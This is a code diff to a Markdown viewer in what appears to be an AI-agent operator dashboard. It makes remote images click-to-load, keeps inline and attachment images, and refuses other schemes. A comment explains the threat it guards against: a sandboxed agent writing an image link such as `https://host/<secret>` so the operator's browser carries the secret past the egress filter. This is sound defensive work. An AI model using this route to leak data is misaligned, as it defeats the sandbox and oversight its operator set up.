@@ -55,26 +55,40 @@ const ALLOWED_TAGS = new Set([
 // property that matters most here.
 const LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:']);
 
-// An image may ONLY come from a self-contained data: URI, restricted to the
-// raster types the notification image preview already trusts. No SVG: it
-// carries script.
-//
-// This is the one place the viewer is deliberately stricter than a general
-// Markdown renderer, and the reason is specific to what tclaude is. An <img>
-// is the only thing in a document that reaches the network on its own, with no
-// click — and the document's author is an agent that may be running behind
-// this project's own egress boundary (see docs/linux-network-filtering.md:
-// default-drop nftables plus a DNS broker admitting only authored names). A
-// remote src would let such an agent write `![](https://host/<secret>)`, wait
-// for the operator to open the report, and have the operator's UNFILTERED
-// browser make the request the agent could not — turning the viewer into a
-// way around the sandbox the operator configured. `referrerpolicy` does not
-// help: it hides which host asked, not that the request happened at all.
-//
-// Inline data: images keep documents genuinely illustrated while staying
-// local, which is the same offline property the vendored parser exists for. A
-// remote image degrades to its alt text (see imageNode).
+// A self-contained data: URI, restricted to the raster types the notification
+// image preview already trusts. No SVG: it carries script. Such an image
+// reaches nothing, so it renders on sight.
 const DATA_IMAGE = /^data:image\/(?:gif|png|jpeg|webp);base64,[a-z0-9+/]+=*$/i;
+
+// The schemes a remote image may name. Anything else — data: that is not a
+// trusted raster, javascript:, ftp:, file: — is not an image target at all.
+const REMOTE_IMAGE_SCHEMES = new Set(['http:', 'https:']);
+
+// REMOTE_IMAGE is the node a document's remote image becomes: a placeholder
+// the operator can turn into a real <img> with one click, rendered by
+// markdown-remote-image.js.
+//
+// It is deliberately not an element name. walk() only ever builds tags out of
+// ALLOWED_TAGS, and this is not in that set, so no document can produce one of
+// these nodes by writing markup — it exists only because resolveImageSource
+// decided an image was remote.
+//
+// Why a remote image is not simply fetched, which is what every other Markdown
+// renderer does. An <img> is the only thing in a document that reaches the
+// network on its own, with no click — and the document's author is an agent
+// that may be running behind this project's own egress boundary (see
+// docs/linux-network-filtering.md: default-drop nftables plus a DNS broker
+// admitting only authored names). Rendered eagerly, an agent could write
+// `![](https://host/<secret>)`, wait for the operator to open the report, and
+// have the operator's UNFILTERED browser make the request the agent could not
+// — turning the viewer into a way around the sandbox the operator configured.
+// `referrerpolicy` does not help: it hides which host asked, not that the
+// request happened at all.
+//
+// Holding the fetch until the operator asks for it keeps that property (no
+// request the operator did not choose) while still letting them see the
+// picture. The placeholder names the host, so the choice is an informed one.
+export const REMOTE_IMAGE = 'remote-image';
 
 // Table-cell alignment is the one inline style markdown-it emits.
 const TEXT_ALIGN = /^text-align:\s*(?:left|center|right)$/i;
@@ -83,14 +97,9 @@ const TEXT_ALIGN = /^text-align:\s*(?:left|center|right)$/i;
 // name reduced to the characters an informative label needs.
 const LANGUAGE_CLASS = /^language-[a-z0-9_.+-]{1,32}$/i;
 
-function safeURL(value, { image = false } = {}) {
+function safeURL(value) {
   const raw = String(value ?? '').trim();
   if (!raw) return null;
-  // An image source is inline or it is nothing — no scheme parsing, because no
-  // scheme is acceptable. A relative src is refused for the same reason a
-  // relative href is, with the extra weight that an image would fetch it
-  // against the dashboard's own origin without the operator clicking anything.
-  if (image) return DATA_IMAGE.test(raw) ? raw : null;
   let parsed;
   try {
     // Parsed with NO base, so only an absolute URL naming its own scheme
@@ -105,6 +114,78 @@ function safeURL(value, { image = false } = {}) {
     return null;
   }
   return LINK_SCHEMES.has(parsed.protocol) ? raw : null;
+}
+
+// A document refers to a file published alongside it the way its author wrote
+// it on the command line: `![map](map.png)` next to `--attach map.png`. Names
+// are compared after dropping a leading `./` and folding case, and after
+// percent-decoding — markdown-it normalizes `map two.png` to `map%20two.png`,
+// which is not what the operator sees in the attachment card. Both spellings
+// are indexed and both are looked up, so a filename containing a literal `%`
+// still matches itself.
+function imageNameKeys(value) {
+  const raw = String(value ?? '').trim().replace(/^\.\//, '');
+  if (!raw) return [];
+  const keys = [raw.toLowerCase()];
+  try {
+    const decoded = decodeURIComponent(raw).replace(/^\.\//, '').toLowerCase();
+    if (decoded && decoded !== keys[0]) keys.push(decoded);
+  } catch {
+    // A malformed escape sequence is compared as it was written.
+  }
+  return keys;
+}
+
+// attachmentImageIndex maps the names a document can use onto the download
+// routes of the images published with it.
+//
+// Only files the daemon has already confirmed are raster images (`previewable`
+// — content-sniffed, SVG excluded) are indexed, which is the same bar the
+// attachment card's own thumbnail passes. Everything else a notification can
+// carry — an SVG, the document itself, a payload whose bytes do not match its
+// declared type — is not something the viewer will build an <img> for, so a
+// reference to it degrades to alt text rather than to a broken image.
+function attachmentImageIndex(attachments) {
+  const index = new Map();
+  for (const attachment of attachments || []) {
+    if (!attachment?.previewable || !attachment.url) continue;
+    for (const key of imageNameKeys(attachment.filename)) {
+      if (!index.has(key)) index.set(key, String(attachment.url));
+    }
+  }
+  return index;
+}
+
+// resolveImageSource decides which of the three kinds of image target this is,
+// and what the viewer should build for it. Null means none of them, and the
+// caller degrades to the alt text.
+function resolveImageSource(value, index) {
+  const raw = String(value ?? '').trim();
+  if (!raw) return null;
+  if (DATA_IMAGE.test(raw)) return { tag: 'img', src: raw };
+  let parsed = null;
+  try {
+    // No base, so this succeeds only for a target naming its own scheme. The
+    // failure is the interesting case: it means a relative target, which is
+    // how a document names a file published with it.
+    parsed = new URL(raw);
+  } catch {
+    // Fall through to the published-file lookup below.
+  }
+  if (parsed) {
+    return REMOTE_IMAGE_SCHEMES.has(parsed.protocol) ? { tag: REMOTE_IMAGE, src: raw } : null;
+  }
+  for (const key of imageNameKeys(raw)) {
+    const url = index.get(key);
+    // The route is the daemon's own, same-origin and authenticated, holding
+    // bytes the operator's daemon already stores. Loading it tells no third
+    // party anything, so unlike a remote image it needs no click.
+    if (url) return { tag: 'img', src: url };
+  }
+  // A relative name matching nothing published, a protocol-relative `//host/x`,
+  // an absolute path: all would resolve against the dashboard's own origin,
+  // which is never what the author meant.
+  return null;
 }
 
 // attributesFor keeps only what each element is allowed to carry, and checks
@@ -126,15 +207,8 @@ function attributesFor(tag, attrs) {
     out.rel = 'noopener noreferrer';
     return out;
   }
-  if (tag === 'img') {
-    // Inline-only by policy (see DATA_IMAGE), so the src never reaches the
-    // network and carries no referrer to suppress.
-    const src = safeURL(source.get('src'), { image: true });
-    if (!src) return out;
-    out.src = src;
-    out.loading = 'lazy';
-    return out;
-  }
+  // 'img' has no branch here on purpose: an image's src is not a value to
+  // check but a choice between three outcomes, so imageNode owns it.
   if (tag === 'ol') {
     const start = Number.parseInt(source.get('start'), 10);
     if (Number.isInteger(start) && start > 0) out.start = start;
@@ -170,11 +244,18 @@ function inlineText(tokens) {
 // image is the one leaf element whose target can be refused. An image the
 // viewer will not load is worth less than the words the author wrote about it,
 // so a rejected src degrades to the alt text rather than to a broken icon.
-function imageNode(token) {
+function imageNode(token, index) {
   const attrs = attributesFor('img', token.attrs);
   const alt = inlineText(token.children || []);
-  if (!attrs.src) return alt;
-  return element('img', { ...attrs, alt }, []);
+  const src = (token.attrs || []).find(([name]) => String(name).toLowerCase() === 'src')?.[1];
+  const resolved = resolveImageSource(src, index);
+  if (!resolved) return alt;
+  if (resolved.tag === REMOTE_IMAGE) {
+    // No `loading` here: the placeholder is what renders, and the real <img>
+    // is built by markdown-remote-image.js only once the operator asks for it.
+    return element(REMOTE_IMAGE, { ...attrs, src: resolved.src, alt }, []);
+  }
+  return element('img', { ...attrs, src: resolved.src, alt, loading: 'lazy' }, []);
 }
 
 function codeBlock(token) {
@@ -189,7 +270,7 @@ function codeBlock(token) {
 // container elements are an opening token (nesting 1) and a closing token
 // (nesting -1) around their content, so the walk keeps a stack of open
 // elements. `inline` tokens carry their own child stream.
-function walk(tokens) {
+function walk(tokens, index) {
   const root = element(null, {}, []);
   const stack = [root];
   const top = () => stack[stack.length - 1];
@@ -200,7 +281,7 @@ function walk(tokens) {
         // Appended one at a time rather than spread: a single paragraph of a
         // large document can carry more inline nodes than an argument list
         // holds, and blowing the stack would lose the whole document.
-        for (const node of walk(token.children || [])) top().children.push(node);
+        for (const node of walk(token.children || [], index)) top().children.push(node);
         continue;
       case 'text':
         if (token.content) top().children.push(token.content);
@@ -216,7 +297,7 @@ function walk(tokens) {
         top().children.push(element('code', {}, [token.content]));
         continue;
       case 'image':
-        top().children.push(imageNode(token));
+        top().children.push(imageNode(token, index));
         continue;
       case 'fence':
       case 'code_block':
@@ -262,11 +343,37 @@ function walk(tokens) {
 
 // markdownToTree parses Markdown source into the viewer's document tree. Nodes
 // are `{ tag, attrs, children }`; a child that is a string is literal text.
-export function markdownToTree(parser, source) {
+//
+// `attachments` is the list of files published with the same notification, in
+// the dashboard snapshot's shape (`filename`, `url`, `previewable`). It is what
+// lets `![map](map.png)` in a report resolve to the image attached beside it.
+export function markdownToTree(parser, source, { attachments } = {}) {
   // A leading byte-order mark is legal in a UTF-8 file and the daemon's sniff
   // accepts one, but markdown-it does not strip it — left in place it glues
   // itself to the first `#` and turns the document's title into a paragraph.
   const text = String(source ?? '').replace(/^\uFEFF/, '');
   if (!text.trim()) return [];
-  return walk(parser.parse(text, {}));
+  return walk(parser.parse(text, {}), attachmentImageIndex(attachments));
+}
+
+// remoteImageSources lists the distinct remote images a rendered tree is
+// holding back, in document order. The viewer uses it to tell the operator how
+// many there are and to offer loading them in one go.
+export function remoteImageSources(nodes) {
+  const found = [];
+  const seen = new Set();
+  const stack = [...(nodes || [])].reverse();
+  while (stack.length) {
+    const node = stack.pop();
+    if (typeof node === 'string' || !node) continue;
+    if (node.tag === REMOTE_IMAGE) {
+      if (!seen.has(node.attrs.src)) {
+        seen.add(node.attrs.src);
+        found.push(node.attrs.src);
+      }
+      continue;
+    }
+    for (let i = (node.children || []).length - 1; i >= 0; i -= 1) stack.push(node.children[i]);
+  }
+  return found;
 }
